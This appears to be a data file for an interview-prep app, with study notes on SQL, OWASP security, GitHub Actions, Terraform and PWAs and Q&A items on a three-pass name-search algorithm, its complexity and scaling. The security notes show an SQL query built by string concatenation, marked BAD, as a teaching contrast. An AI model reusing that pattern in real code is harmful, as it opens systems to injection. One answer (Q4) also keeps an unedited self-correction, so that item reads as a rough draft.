        body: `INNER JOIN — only rows with matches in both tables.
  SELECT e.firstName, d.name
  FROM employees e
  INNER JOIN departments d ON e.departmentId = d.id;

LEFT JOIN — all rows from the left table, matched rows from the right (NULL if no match).
  SELECT e.firstName, d.name
  FROM employees e
  LEFT JOIN departments d ON e.departmentId = d.id;
  -- Returns all employees even if they have no department

RIGHT JOIN — opposite of LEFT JOIN (rarely used; just swap table order).

When to use which: LEFT JOIN when you want all records from the primary table regardless of whether a related record exists (e.g. employees without a department).`,
      },
      {
        heading: 'Transactions and ACID',
        body: `A transaction groups multiple SQL statements into an atomic unit.

  BEGIN;
  UPDATE accounts SET balance = balance - 100 WHERE id = 1;
  UPDATE accounts SET balance = balance + 100 WHERE id = 2;
  COMMIT;  -- or ROLLBACK if something fails

ACID properties:
  Atomicity    — all steps succeed or none do (no partial updates)
  Consistency  — data always moves from one valid state to another
  Isolation    — concurrent transactions don't see each other's partial state
  Durability   — committed data survives crashes

Relevant for: any feature that updates multiple related records (e.g. creating an employee and their contract at the same time).`,
      },
    ],
  },
  {
    id: 'security',
    title: 'Security & Best Practices',
    content: [
      {
        heading: 'OWASP Top 10 — the ones most likely to come up',
        body: `Injection (SQL, NoSQL, command) — attacker injects malicious input that gets executed.
  Prevention: use parameterised queries / prepared statements. Never concatenate user input into SQL.
  BAD:  "SELECT * FROM employees WHERE name = '" + name + "'"
  GOOD: db.query("SELECT * FROM employees WHERE name = ?", [name])

Cross-Site Scripting (XSS) — attacker injects malicious scripts into pages viewed by other users.
  Prevention: escape output, use React (which escapes by default), avoid dangerouslySetInnerHTML.

Broken Authentication — weak tokens, no rate limiting, credentials in URLs.
  Prevention: use short-lived JWTs, httpOnly cookies, rate limit login endpoints.

Security Misconfiguration — default credentials, open S3 buckets, verbose error messages.
  Prevention: infrastructure-as-code (Terraform) enforces config consistently.

Sensitive Data Exposure — logging passwords, storing secrets in env vars visible in console.
  Prevention: AWS Secrets Manager, never log sensitive fields.`,
      },
      {
        heading: 'Authentication vs Authorisation',
        body: `Authentication — who are you? (login, JWT, session)
Authorisation — what are you allowed to do? (roles, permissions)

JWT (JSON Web Token):
  - Header.Payload.Signature — base64 encoded, signed with a secret or private key
  - Stateless — server doesn't need to store sessions
  - Short TTL (15 min access token) + refresh token (longer lived, stored in httpOnly cookie)

In a multi-tenant system: employees belong to client companies. Authorisation must ensure Company A cannot access Company B's employee data — row-level security in the DB or in the resolver.

Common mistake: checking authentication but not authorisation — a valid token doesn't mean the user can access any resource.`,
      },
      {
        heading: 'Input validation and sanitisation',
        body: `Validate at system boundaries — user input, API requests, webhook payloads.

For the search endpoint:
  - searchString should be a string (not an object, array, or null)
  - Maximum length (e.g. 500 chars) prevents DoS via huge inputs
  - No need to validate arrayToSearch on every call — it comes from your own DB

Libraries:
  - zod (TypeScript-first schema validation)
  - joi (popular, mature)
  - express-validator (for Express routes)

Example with zod:
  const schema = z.object({ searchString: z.string().min(1).max(500) });
  const { searchString } = schema.parse(req.body);
  // Throws if invalid — caught by error handler`,
      },
      {
        heading: 'CORS and API security',
        body: `CORS (Cross-Origin Resource Sharing) — browsers block requests from one origin to another unless the server explicitly allows it.

In Express:
  app.use(cors({ origin: 'https://app.example.com' }));
  // Only your frontend can call the API

In API Gateway (AWS): configure allowed origins in the CORS settings for each route.

Other API security basics:
  - HTTPS only — never serve sensitive data over HTTP
  - Rate limiting — prevent brute force and DoS (express-rate-limit)
  - Helmet.js — sets security-related HTTP headers (X-Frame-Options, CSP, etc.)
  - Never return stack traces to clients — log server-side only`,
      },
      {
        heading: 'Secrets management',
        body: `Never store secrets in:
  ✗ Code / git history (even if later deleted — it's in git history)
  ✗ Environment variables in Lambda config (visible in AWS console to anyone with access)
  ✗ .env files committed to the repo

Do store secrets in:
  ✓ AWS Secrets Manager — Lambda fetches at runtime, cached for container lifetime
  ✓ AWS Parameter Store (SSM) — cheaper, good for non-sensitive config
  ✓ GitHub Actions Secrets — for CI/CD credentials

Rotation: Secrets Manager supports automatic rotation of DB passwords. The Lambda picks up the new password on the next container init without any code changes.`,
      },
    ],
  },
  {
    id: 'cicd',
    title: 'CI/CD & Infrastructure',
    content: [
      {
        heading: 'GitHub Actions — core concepts',
        body: `Workflow: a YAML file in .github/workflows/. Triggered by events (push, PR, schedule).

Key concepts:
  on: push / pull_request — when the workflow fires
  jobs — independent units of work that can run in parallel or in sequence
  steps — ordered commands within a job
  needs — declares job dependencies (deploy needs: [test])
  secrets — stored in GitHub, referenced as \${{ secrets.NAME }}

Best practice pipeline for this stack:
  on: [pull_request]   → run tests + type check + lint (blocks merge if fails)
  on: push to main     → run tests + build + deploy to AWS

Branch protection: set the CI job as a required status check in GitHub settings. The merge button is blocked until it passes.`,
      },
      {
        heading: 'Terraform — what to know',
        body: `Terraform declares desired AWS infrastructure state in .tf files. terraform apply reconciles reality with the desired state.

Key commands:
  terraform init    — download providers and modules
  terraform plan    — preview changes (always run before apply)
  terraform apply   — make the changes
  terraform destroy — tear everything down

State: stored remotely in S3 with DynamoDB locking. Never edit state manually.

Workspaces: separate state per environment (dev / staging / prod) using the same .tf code.
  terraform workspace new staging
  terraform workspace select prod

Why it matters: Terraform means infrastructure is version-controlled, reviewable, and reproducible — no "snowflake servers" configured by hand.`,
      },
      {
        heading: 'Monorepo architecture',
        body: `All packages in one Git repository. Common structure for this stack:

  /packages
    /web        — React SPA (Vite + TypeScript)
    /api        — Node.js Lambda handlers
    /shared     — shared TypeScript types (Employee, SearchParams, etc.)
  /infrastructure — Terraform configs
  turbo.json    — Turborepo pipeline config

Benefits:
  ✓ Single PR for cross-cutting changes (e.g. rename Employee.firstName)
  ✓ Shared types eliminate frontend/backend drift
  ✓ Unified CI pipeline
  ✓ Turborepo caches build/test outputs — only rebuilds changed packages

Trade-offs:
  ✗ Repo grows large over time
  ✗ CI must be smart about running only affected tests (Turborepo handles this)
  ✗ Dependency management more complex — one package.json or many?`,
      },
      {
        heading: 'Progressive Web Apps (PWA)',
        body: `A PWA is a web app that behaves like a native app — installable, works offline, receives push notifications.

Key components:
  Service Worker — a script that runs in the background, intercepts network requests, manages caching
  Web App Manifest — JSON file declaring app name, icons, theme colour, display mode
  HTTPS — required for service workers

Caching strategies (via the service worker):
  Cache First    — serve from cache, fall back to network (good for static assets)
  Network First  — try network, fall back to cache (good for API data)
  Stale While Revalidate — serve cached version immediately, update cache in background

For an HR platform: a PWA would let users access guidance offline — useful for employees in areas with poor connectivity.`,
      },
      {
        heading: 'Deployment pipeline end-to-end',
        body: `Developer pushes a feature branch:
  1. GitHub Actions triggers on pull_request
  2. yarn install --frozen-lockfile
  3. tsc --noEmit (type check)
  4. eslint
  5. jest --ci --coverage
  6. If all pass → PR can be merged

PR merged to main:
  1. GitHub Actions triggers on push to main
  2. Steps 2–5 repeat
  3. yarn build (Vite bundles the React app)
  4. terraform apply (provision/update AWS infrastructure)
  5. aws s3 sync dist/ s3://app-bucket/ (deploy frontend)
  6. aws lambda update-function-code (deploy API)
  7. CloudFront invalidation (clear CDN cache)

Rollback: because Lambda keeps previous versions, rolling back is:
  aws lambda update-alias --function-name search --function-version 47`,
      },
    ],
  },
];

const QUESTIONS = [
  // ── SOLUTION ──────────────────────────────────────────────────────────────
  {
    id: 1,
    category: 'solution',
    difficulty: 'easy',
    question: 'What are the three passes in searchForNames and what order do they run?',
    answer: 'Full names first, then first names, then last names. This order enforces the priority rule: a full name beats a partial match. Once words are claimed by a full-name match they cannot be matched again.',
    tip: 'Think about the "Bob/Billy Bob" problem — why does full names need to go first?',
  },
  {
    id: 2,
    category: 'solution',
    difficulty: 'easy',
    question: 'What is usedIndexes and what problem does it solve?',
    answer: 'usedIndexes is a Set of word positions in the search string that have already been matched to a name. It prevents one word in the search string from matching two different names — e.g. the word "bob" at index 2 can only be claimed by one name.',
    tip: 'The claiming system is the key insight of the whole solution.',
  },
  {
    id: 3,
    category: 'solution',
    difficulty: 'medium',
    question: 'Why are names deduplicated before matching, and why does the final filter run on the original array?',
    answer: 'Names are deduplicated so we only claim words from the search string once — two "Amy Smith" entries should only claim the words "amy" and "smith" one time. The final filter runs on the original array (with duplicates) so both Amy Smith employees are returned in the result. Deduplication was only for the claiming phase.',
    tip: 'Amy Smith appears twice in the test data — both must be returned.',
  },
  {
    id: 4,
    category: 'solution',
    difficulty: 'medium',
    question: 'What happens when you search for "bob\'s emergency contact?" — walk through which pass matches it and why.',
    answer: `splitIntoWords strips the 's → searchWords = ["bob","s","emergency","contact"]... wait, actually "bob's" → strips 's → "bob". Pass 1: looks for full names — "Bob Matthews" needs "bob" then "matthews" consecutively, but "matthews" isn't in the string, no match. Pass 2: "Bob" as a first name — not consumed by any full-name match, claimMatch("Bob") finds "bob" at index 0, claims it. matchedFirstNames = {"Bob"}. Pass 3: "Bob" as a last name (Billy Bob) — guard 2 checks matchedFirstNames.has("Bob") = true → SKIPPED. Result: Bob Matthews only.`,
    tip: 'The guard in Pass 3 (!matchedFirstNames.has(lastName)) is what blocks Billy Bob from also being returned.',
  },
  {
    id: 5,
    category: 'solution',
    difficulty: 'hard',
    question: 'What would break if you ran Pass 2 (first names) before Pass 1 (full names)?',
    answer: 'Consider searching "jane flitwick". If first names ran first, "jane" would be claimed by the first-name pass. Then when the full-name pass tries to match "Jane Flitwick", index for "jane" is already used — the full-name claim fails. You\'d get both Jane Doe AND Jane Flitwick returned (from the first-name match) instead of only Jane Flitwick. The priority rule is broken.',
    tip: 'Order is everything — the full-name pass must claim words before first names get a chance.',
  },
  // ── FUNCTIONS ─────────────────────────────────────────────────────────────
  {
    id: 6,
    category: 'functions',
    difficulty: 'easy',
    question: 'Why does isLetter use toLowerCase() !== toUpperCase() instead of a regex like /[a-zA-Z]/?',
    answer: 'The regex /[a-zA-Z]/ only matches ASCII letters and misses accented characters like é, ñ, ü, María, Rémi, Valéry. The toLowerCase/toUpperCase trick works for the full Unicode letter range because letters always have distinct upper and lower forms, while digits and punctuation have the same form in both cases.',
    tip: 'The test data includes Spanish and French names with accents — this is why it matters.',
  },
  {
    id: 7,
    category: 'functions',
    difficulty: 'easy',
    question: 'What does splitIntoWords do with "nikki\'s holiday"?',
    answer: '1. Lowercase → "nikki\'s holiday"\n2. Non-letter chars except apostrophe → keep apostrophe\n3. Split on spaces → ["nikki\'s", "holiday"]\n4. Strip possessive \'s → "nikki"\nResult: ["nikki", "holiday"]',
    tip: 'Both straight apostrophe (\') and curly apostrophe (\u2019) are handled.',
  },
  {
    id: 8,
    category: 'functions',
    difficulty: 'medium',
    question: 'What does findMatches return for a single-word first name like "Jane" found at position 2 in the search string?',
    answer: '[[2]] — an array containing one index array with a single element. findMatches always returns an array of index arrays, regardless of name length. For "Jane" (1 word) each match is a single-element array. For "Billy Bob" (2 words) each match is a two-element array like [3,4]. It only returns [] if the name is not found at all.',
    tip: 'A common misconception — findMatches doesn\'t only return pairs. The inner array length equals the number of words in the name.',
  },
  {
    id: 9,
    category: 'functions',
    difficulty: 'medium',
    question: 'What does claimMatch return if the name appears in the search string but all its word positions are already in usedIndexes?',
    answer: 'false. findMatches finds the positions, but .find() cannot find any match where all indices are unclaimed. The name is not added to any matched set and those positions stay as-is in usedIndexes.',
    tip: 'This is how "jane" gets blocked from matching Jane Doe after "Jane Flitwick" was already claimed.',
  },
  {
    id: 10,
    category: 'functions',
    difficulty: 'hard',
    question: 'Why does splitIntoWords use Array.from(text) instead of text.split("")?',
    answer: 'Array.from() correctly handles multi-byte Unicode code points (surrogate pairs). text.split("") can break apart certain characters, producing garbled output for rare Unicode characters. The accented names in the test data make defensive Unicode handling important.',
    tip: 'This is a subtle JS gotcha — good to mention proactively as it shows Unicode awareness.',
  },
  {
    id: 11,
    category: 'functions',
    difficulty: 'hard',
    question: 'Why are startsWithWords and endsWithWords needed as guards — why not just rely on usedIndexes?',
    answer: 'usedIndexes tracks word positions in the search string, but the guard checks are about whether a name was consumed conceptually. If "Jane Flitwick" was matched, the indices for "jane" are claimed. But the guard startsWithWords prevents "Jane" even reaching claimMatch — avoiding the cost of findMatches entirely, and correctly skipping the first name regardless of which specific search string position it was at.',
    tip: 'The guards are both an optimisation and a correctness check.',
  },
  // ── EXECUTION FLOW ────────────────────────────────────────────────────────
  {
    id: 12,
    category: 'execution',
    difficulty: 'easy',
    question: 'How many times is splitIntoWords called on the search string?',
    answer: 'Exactly once — at the very start of the function. The result (searchWords) is stored and passed to every subsequent call to findMatches, claimMatch, etc. This is efficient: the search string does not get re-tokenised per name.',
    tip: 'In contrast, name strings get tokenised inside findMatches on every call — a potential optimisation.',
  },
  {
    id: 13,
    category: 'execution',
    difficulty: 'medium',
    question: 'In what state are the four Sets (usedIndexes, matchedFullNames, matchedFirstNames, matchedLastNames) at the start of Pass 2?',
    answer: 'usedIndexes contains all word positions claimed by full-name matches. matchedFullNames contains the strings of all matched full names. matchedFirstNames and matchedLastNames are still empty — they are only populated in Passes 2 and 3 respectively.',
    tip: 'Drawing the state at each phase is a great way to explain the algorithm in an interview.',
  },
  {
    id: 14,
    category: 'execution',
    difficulty: 'medium',
    question: 'For the search "when is jane on holiday?" — which pass matches "jane" and what is added to usedIndexes?',
    answer: 'Pass 1 finds no full name containing "jane" (neither "Jane Doe" nor "Jane Flitwick" appear as consecutive words). Pass 2: guard check — matchedFullNames is empty, so guard passes. claimMatch("Jane") runs, finds "jane" at index 2, claims it. usedIndexes = {2}. matchedFirstNames = {"Jane"}. Final filter returns both Jane Doe and Jane Flitwick.',
    tip: 'Both Jane employees are returned because the filter checks firstName, not the full name.',
  },
  {
    id: 15,
    category: 'execution',
    difficulty: 'hard',
    question: 'Why does the iteration order of uniqueFullNames matter and what could go wrong with ambiguous inputs?',
    answer: 'uniqueFullNames is built from the order of employees in arrayToSearch. Whichever full name appears first in that array gets first claim on any shared words. With ambiguous inputs not covered by the test suite, the result could depend on employee ordering rather than any defined priority. This is a known weakness — for deterministic behaviour, names should be sorted (e.g. longest first) before the claiming loop.',
    tip: 'This is a great weakness to proactively raise in the interview — it shows you thought beyond the test cases.',
  },
  // ── COMPLEXITY ────────────────────────────────────────────────────────────
  {
    id: 16,
    category: 'complexity',
    difficulty: 'easy',
    question: 'What is the overall time complexity of searchForNames?',
    answer: 'O(N × W × F) where N = unique employee names, W = words in the search string, F = words in a given name. With N ≤ 50, W < 20, F ≤ 4, this is roughly 4,000 operations worst case — effectively constant time for the given constraints.',
    tip: 'Always mention the constraint (N ≤ 50) when giving complexity — it justifies the approach.',
  },
  {
    id: 17,
    category: 'complexity',
    difficulty: 'easy',
    question: 'What is the space complexity?',
    answer: 'O(N + W). O(N) for the three match Sets and three unique name arrays. O(W) for searchWords and usedIndexes. This is optimal — you must track matched employees (O(N)) and claimed word positions (O(W)).',
    tip: 'Space is already optimal — there is no meaningful reduction possible.',
  },
  {
    id: 18,
    category: 'complexity',
    difficulty: 'medium',
    question: 'Where are the repeated computations in the current solution?',
    answer: '1. splitIntoWords is called repeatedly on the same name strings — every findMatches, startsWithWords, endsWithWords call re-tokenises the same names.\n2. [...matchedFullNames] spread inside the forEach loops creates a new array on every iteration.\n3. startsWithWords is called for every firstName against every matched full name — O(matched full names × unique first names) calls.',
    tip: 'Mention these as things you noticed and know how to fix — caching normalised tokens upfront.',
  },
  {
    id: 19,
    category: 'complexity',
    difficulty: 'medium',
    question: 'Why is Set used for usedIndexes instead of an Array?',
    answer: 'Set gives O(1) average .has() lookup vs O(N) linear scan for Array. Also provides automatic deduplication. For usedIndexes specifically, the membership check (is this index already claimed?) is called in the hot path of claimMatch — O(1) vs O(W) per check matters at scale.',
    tip: 'Always explain both the complexity benefit AND the deduplication benefit.',
  },
  {
    id: 20,
    category: 'complexity',
    difficulty: 'hard',
    question: 'How would you optimise this for 1 million employees?',
    answer: 'Two strategies:\n\n1. Inverted word index: pre-build a Map<word, Set<employeeIndex>>. Lookup becomes O(W) — only check employees whose names share a word with the search string.\n\n2. Cache normalised tokens: run splitIntoWords once per employee at startup, not on every comparison. Eliminates O(N × passes) redundant tokenisations.\n\nCombined: reduces from O(N×W) to O(W + K) where K = candidate employees with at least one shared word.',
    tip: 'The inverted index is the key insight — flip the direction of the lookup.',
  },
  // ── TYPESCRIPT ────────────────────────────────────────────────────────────
  {
    id: 21,
    category: 'typescript',
    difficulty: 'easy',
    question: 'What TypeScript interface would you add to searchForNames?',
    answer: `interface Employee {
  firstName: string;
  lastName:  string;
}

interface SearchParams {
  arrayToSearch: Employee[];
  searchString:  string;
}

function searchForNames({ arrayToSearch, searchString }: SearchParams): Employee[]`,
    tip: 'The return type Employee[] is important — it tells callers exactly what shape comes back.',
  },
  {
    id: 22,
    category: 'typescript',
    difficulty: 'medium',
    question: 'What is the return type of findMatches in TypeScript and why?',
    answer: 'number[][] — an array of arrays of numbers. Each inner array contains the word indices (numbers) in searchWords where a match was found. e.g. [[0,1]] for "Bob Matthews" at position 0, or [[2]] for "Jane" at position 2.',
    tip: 'Think about what findMatches actually returns — an array of index arrays.',
  },
  {
    id: 23,
    category: 'typescript',
    difficulty: 'medium',
    question: 'What does strictNullChecks do and what would it change in this code?',
    answer: 'strictNullChecks prevents null and undefined from being assigned to typed variables unless explicitly allowed. In this code: arrayToSearch and searchString cannot be null/undefined without adding Employee[] | null or string | undefined to the type. At call sites, passing undefined would be a compile error. It forces defensive thinking about missing data at the type level rather than at runtime.',
    tip: 'strictNullChecks is part of the "strict": true tsconfig flag — production TypeScript projects almost certainly have this enabled.',
  },

  // ── IMPROVEMENTS ──────────────────────────────────────────────────────────
  {
    id: 24,
    category: 'improvements',
    difficulty: 'easy',
    question: 'If you had more time, what is the first thing you would fix in this solution?',
    answer: 'The matchedFirstNames.has(lastName) guard in Pass 3. It only works when a lastName string exactly equals a matched firstName string. For multi-word last names like "de la Batte", the guard silently fails — it never equals a single-word first name in the Set. The fix is to check whether the last name\'s word positions are already in usedIndexes instead of doing a string comparison against matchedFirstNames.',
    tip: 'Proactively raising this shows you thought beyond passing the tests.',
  },
  {
    id: 25,
    category: 'improvements',
    difficulty: 'easy',
    question: 'What repeated computation happens in the current solution and how would you eliminate it?',
    answer: 'splitIntoWords is called on the same name strings repeatedly — every call to findMatches, startsWithWords, and endsWithWords re-tokenises the name. With 50 employees and 3 passes, a name could be tokenised 10+ times.\n\nFix: pre-compute normalised word arrays once before the passes:\n\n  const normalised = arrayToSearch.map(emp => ({\n    emp,\n    fullWords: splitIntoWords(emp.firstName + " " + emp.lastName),\n    firstWords: splitIntoWords(emp.firstName),\n    lastWords: splitIntoWords(emp.lastName),\n  }));\n\nAlso: snapshot [...matchedFullNames] once before Pass 2 and Pass 3 instead of spreading it inside every forEach iteration.',
    tip: 'Two separate issues here — name tokenisation AND the Set spread. Mention both.',
  },
  {
    id: 26,
    category: 'improvements',
    difficulty: 'medium',
    question: 'Why does the iteration order of uniqueFullNames matter and how would you make it deterministic?',
    answer: 'uniqueFullNames is built from the order of employees in arrayToSearch. Whichever full name appears first gets first claim on shared words. With ambiguous inputs not in the test suite, results could vary based on employee ordering rather than any defined rule.\n\nFix: sort by name specificity before the claiming loop — longer names (more words) first, so the most specific match always wins:\n\n  uniqueFullNames.sort((a, b) =>\n    splitIntoWords(b).length - splitIntoWords(a).length\n  );\n\nThis ensures "María Susana Giménez" (3 words) is tried before "María Susana" (2 words) if both exist.',
    tip: 'This is a known weakness worth raising proactively — it shows you thought about edge cases beyond the test suite.',
  },
  {
    id: 27,
    category: 'improvements',
    difficulty: 'medium',
    question: 'How would you refactor the three passes to improve readability?',
    answer: 'Extract each pass into a named function:\n\n  function claimFullNames(searchWords, uniqueFullNames, usedIndexes)\n  function claimFirstNames(searchWords, uniqueFirstNames, matchedFullNames, usedIndexes)\n  function claimLastNames(searchWords, uniqueLastNames, matchedFullNames, matchedFirstNames, usedIndexes)\n\nThe main function then reads as pure orchestration — it\'s immediately obvious what runs in what order and why. Each function can also be unit-tested independently.\n\nSecondary refactor: combine the three match Sets into direct accumulation of employee objects, removing the final filter pass.',
    tip: 'Readability refactors show you write code for the next engineer, not just for the compiler.',
  },
  {
    id: 28,
    category: 'improvements',
    difficulty: 'hard',
    question: 'How would you unit test the internal helper functions like splitIntoWords and claimMatch?',
    answer: 'Two options:\n\n1. Export them (named exports alongside searchForNames) — enables direct unit tests like expect(splitIntoWords("nikki\'s")).toEqual(["nikki"]). More granular, but exposes implementation details.\n\n2. Test them indirectly through searchForNames — the existing 24 test cases already exercise every branch of splitIntoWords via the inputs they use. This is the preferred approach: helpers are implementation details, and the public API is what matters.\n\nFor claimMatch specifically: since it closes over usedIndexes, testing it directly would require exposing that state. Better to test its effects through full searchForNames calls.',
    tip: 'The "test through the public API" answer shows understanding of what tests should protect.',
  },
  {
    id: 29,
    category: 'improvements',
    difficulty: 'hard',
    question: 'What would a production-ready version of this function look like compared to the current solution?',
    answer: 'Key additions for production:\n\n1. TypeScript types — Employee interface, SearchParams, explicit return type\n2. Input validation at the boundary — guard against null/undefined arrayToSearch or searchString\n3. Cached normalised tokens — pre-compute splitIntoWords results once\n4. Deterministic ordering — sort names by length before claiming\n5. Named pass functions — extracted for testability and readability\n6. JSDoc — document the priority rules and constraints\n7. Error boundaries — if an employee object is malformed (missing firstName), handle gracefully rather than crashing\n\nWhat would NOT change: the core algorithm and claiming logic — it\'s already correct and well-suited to the stated constraints.',
    tip: 'Frame "production ready" as additions around a correct core — not a rewrite.',
  },

  // ── SCALING ───────────────────────────────────────────────────────────────
  {
    id: 30,
    category: 'scaling',
    difficulty: 'easy',
    question: 'Why does the current solution not scale to 1 million employees?',
    answer: 'The algorithm is O(N × W × F). At N=50 this is ~4,000 operations — negligible. At N=1,000,000 it\'s ~80,000,000 operations per search request. If the endpoint is called by thousands of concurrent users, this is unsustainable.\n\nAlso: storing 1M employees in a JavaScript array in memory is impractical. At even 100 bytes per employee, that\'s 100MB of data loaded into every Lambda function invocation.',
    tip: 'Two separate problems: algorithmic complexity AND memory — mention both.',
  },
  {
    id: 31,
    category: 'scaling',
    difficulty: 'easy',
    question: 'What is an inverted word index and how does it help here?',
    answer: 'An inverted index maps each word to the set of employees whose names contain that word:\n\n  Map<word, Set<employeeIndex>>\n  "jane" → {0, 4}   (Jane Doe at index 0, Jane Flitwick at index 4)\n  "doe"  → {0, 5}   (Jane Doe at 0, Dan Doe at 5)\n\nAt query time, tokenise the search string and look up each word in the index. The union of results is your candidate set — typically a tiny fraction of 1M employees. Then apply the full priority-matching logic only on those candidates.\n\nLookup complexity drops from O(N × W) to O(W + K) where K is the number of candidate employees.',
    tip: 'The key insight: flip the direction of the lookup. Instead of checking every employee against the search string, look up which employees match each word.',
  },
  {
    id: 32,
    category: 'scaling',
    difficulty: 'medium',
    question: 'What changes when you move from in-memory to a database at scale?',
    answer: 'Three main changes:\n\n1. Data lives in MySQL (RDS) — not in a JavaScript array. Employees are fetched per request or a subset is returned by a DB query.\n\n2. The DB does coarse filtering — MySQL FULLTEXT index can return employees whose firstName or lastName contains any search word. This is fast and offloads work from the application.\n\n3. The application code does fine-grained priority matching — the searchForNames logic (claiming, priority passes) still runs in Node.js, but only on the small candidate set returned by MySQL.\n\nThe function signature doesn\'t change — it still takes arrayToSearch and searchString. The caller is responsible for fetching the right candidates.',
    tip: 'The algorithm itself doesn\'t need to change — what changes is how arrayToSearch gets populated.',
  },
  {
    id: 33,
    category: 'scaling',
    difficulty: 'medium',
    question: 'How does MySQL FULLTEXT search work and what are its limitations for this use case?',
    answer: 'MySQL FULLTEXT index enables fast keyword search:\n\n  ALTER TABLE employees ADD FULLTEXT(firstName, lastName);\n  SELECT * FROM employees\n  WHERE MATCH(firstName, lastName)\n  AGAINST (\'jane flitwick\' IN BOOLEAN MODE);\n\nLimitations relevant to this problem:\n1. Minimum word length (default 3 chars) — "Amy" (3) just makes it; "Jo" would not be indexed\n2. Does not understand priority (full > first > last) — that logic stays in application code\n3. Does not strip possessives — "nikki\'s" would not match "nikki" without preprocessing\n4. Returns candidates, not final results — the application still needs to apply priority matching\n\nBest used as a fast candidate filter, not a replacement for the full algorithm.',
    tip: 'MySQL FULLTEXT is a coarse filter. The application layer still applies the precise priority logic.',
  },
  {
    id: 34,
    category: 'scaling',
    difficulty: 'medium',
    question: 'Where would you add caching in a scaled version of this feature?',
    answer: 'Three caching layers:\n\n1. Normalised name tokens — cache splitIntoWords results per employee in memory at startup. Eliminates repeated tokenisation. Invalidated when employee data changes.\n\n2. Redis query cache — cache the result of common search strings (e.g. "redundancy pay for jane") with a short TTL. If the same query arrives again, return the cached result without hitting the DB.\n\n3. DB connection pool — not a cache per se, but re-using database connections instead of opening a new connection per Lambda invocation dramatically reduces latency.\n\nCache invalidation: when an employee is added, renamed, or removed, the in-memory token cache and any Redis entries for queries that matched that employee must be invalidated.',
    tip: 'Cache invalidation is always the hard part — mention it proactively.',
  },
  {
    id: 35,
    category: 'scaling',
    difficulty: 'hard',
    question: 'How would a trie improve name matching at scale and when is it worth the complexity?',
    answer: 'A word-level trie built from all employee names allows a single left-to-right scan of searchWords to identify all matching names.\n\nStructure: each node is a word; leaf nodes store the employees whose name ends there.\n  root → "jane" → "doe" → [Jane Doe]\n                → "flitwick" → [Jane Flitwick]\n\nAt query time: walk searchWords once, following trie edges. O(W × max_name_depth) total — one scan of the search string instead of N × W comparisons.\n\nWorth it when: N > 100,000 AND the index is built once and queried many times. The O(N × F) build cost amortises across many queries.\n\nNot worth it when: N ≤ 50 (current case), or the employee list changes frequently (index rebuild cost).',
    tip: 'The trie is the "impressive" answer — mention it to show awareness, but justify why you didn\'t use it here.',
  },
  {
    id: 36,
    category: 'scaling',
    difficulty: 'hard',
    question: 'What is the full production architecture for this feature at 1 million employees?',
    answer: 'Request path:\n  React SPA → API Gateway → Lambda (Node.js)\n                               ↓\n                         MySQL (RDS) FULLTEXT query → candidate set (~10-50 employees)\n                               ↓\n                         searchForNames(candidates, searchString) → priority matching\n                               ↓\n                         Redis cache write (TTL 60s)\n                               ↓\n                         GraphQL response → React renders results\n\nSupporting infrastructure:\n- RDS with read replica for search queries (don\'t hit primary)\n- Redis (ElastiCache) for query result caching\n- CloudWatch metrics on Lambda duration and DB query time\n- Index rebuild job (EventBridge + Lambda) triggered when employee data changes\n\nKey principle: MySQL/Elasticsearch does O(log N) coarse filtering; application code does O(K) precise matching on a small candidate set.',
    tip: 'This answer ties together AWS services from your tech stack knowledge — Lambda, RDS, Redis/ElastiCache, CloudWatch.',
  },
  {
    id: 37,
    category: 'scaling',
    difficulty: 'hard',
    question: 'What are the trade-offs between the current simple approach and a fully scaled architecture?',
    answer: 'Current approach:\n  ✓ Simple, readable, zero infrastructure dependencies\n  ✓ All logic in one place, easy to test in isolation\n  ✓ Correct for N ≤ 50 as stated in the spec\n  ✗ O(N × W × F) — unsustainable beyond ~10,000 employees\n  ✗ Cannot persist data across Lambda cold starts\n\nScaled approach:\n  ✓ O(W + K) per query — handles millions of employees\n  ✓ Data persisted in DB, survives restarts\n  ✗ Index must be maintained — stale if employees are added/removed without rebuild\n  ✗ Cache invalidation complexity\n  ✗ More infrastructure to operate and monitor\n  ✗ Local development requires a DB and Redis running\n\nThe right answer for this interview: "The current solution is intentionally simple because N ≤ 50 was explicitly stated. Jumping to an inverted index for 50 employees would be premature optimisation. But I know the path to scale and can implement it when the constraint changes."',
    tip: 'Always justify your current choice before explaining what you\'d change. Premature optimisation is a real risk.',
  },

  // ── REACT ─────────────────────────────────────────────────────────────────
  {
    id: 38,
    category: 'react',
    difficulty: 'easy',
    question: 'What is the difference between useState and useRef?',
    answer: 'useState: holds state that, when updated, triggers a re-render of the component. Use it for values the UI depends on.\n\nuseRef: holds a mutable value in a .current property. Changing it does NOT trigger a re-render. Use it for:\n  - Referencing a DOM node (e.g. to focus an input)\n  - Storing a timer ID or previous value\n  - Caching a value across renders without causing re-renders\n\nExample: a debounce timer ID should be a ref, not state — you don\'t want the component to re-render when the timer is set or cleared.',
    tip: 'The key distinction: state changes cause re-renders, ref changes do not.',
  },
  {
    id: 39,
    category: 'react',
    difficulty: 'easy',
    question: 'What does the dependency array in useEffect do? What happens with an empty array vs no array?',
    answer: 'The dependency array controls when the effect re-runs:\n\n  useEffect(() => { ... }, [a, b])  → runs when a or b changes\n  useEffect(() => { ... }, [])     → runs once on mount only\n  useEffect(() => { ... })         → runs after every render\n\nCommon mistake: omitting a dependency that the effect uses. This causes stale closures — the effect captures the old value of the variable and never sees updates.\n\nFor the employee search feature: fetch data when debouncedQuery changes:\n  useEffect(() => {\n    if (!debouncedQuery) return;\n    fetchEmployees(debouncedQuery);\n  }, [debouncedQuery]);',
    tip: 'Missing dependencies cause stale closures — the eslint-plugin-react-hooks rule exhaustive-deps catches these.',
  },
  {
    id: 40,
    category: 'react',
    difficulty: 'medium',
    question: 'Why would you use useMemo in a search results component and when would you NOT use it?',
    answer: 'Use useMemo when: an expensive computation runs on every render and its output only changes when specific values change.\n\n  const results = useMemo(() =>\n    searchForNames({ arrayToSearch: employees, searchString }),\n    [employees, searchString]\n  );\n\n  // Without useMemo: searchForNames runs on every re-render (e.g. every keystroke)\n  // With useMemo: only re-runs when employees or searchString actually changes\n\nDo NOT use useMemo when:\n  ✗ The computation is cheap — memoisation has its own overhead\n  ✗ The dependencies change on every render anyway — no benefit\n  ✗ You haven\'t profiled and confirmed it\'s actually slow\n\nRule of thumb: profile first, optimise second.',
    tip: 'Premature memoisation is a real problem — it adds complexity with no benefit if the computation is cheap.',
  },
  {
    id: 41,
    category: 'react',
    difficulty: 'medium',
    question: 'How would you build a debounced search input in React?',
